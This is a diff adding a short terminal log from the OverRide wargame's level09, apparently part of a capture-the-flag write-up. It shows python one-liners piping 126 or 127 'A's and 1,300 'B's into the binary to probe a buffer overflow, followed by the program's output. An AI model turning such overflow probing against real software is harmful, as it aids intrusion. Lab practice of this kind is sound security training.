@@ -1,0 +1,19 @@
+level09@OverRide:~$ (python -c 'print "A" * 126'; python -c 'print "B" * 1300') | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
+>>: >: Msg sent!
+level09@OverRide:~$ (python -c 'print "A" * 127'; python -c 'print "B" * 1300') | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
+>>: >: Msg sent!
+close failed in file object destructor:
+sys.excepthook is missing
+lost sys.stderr
+
+
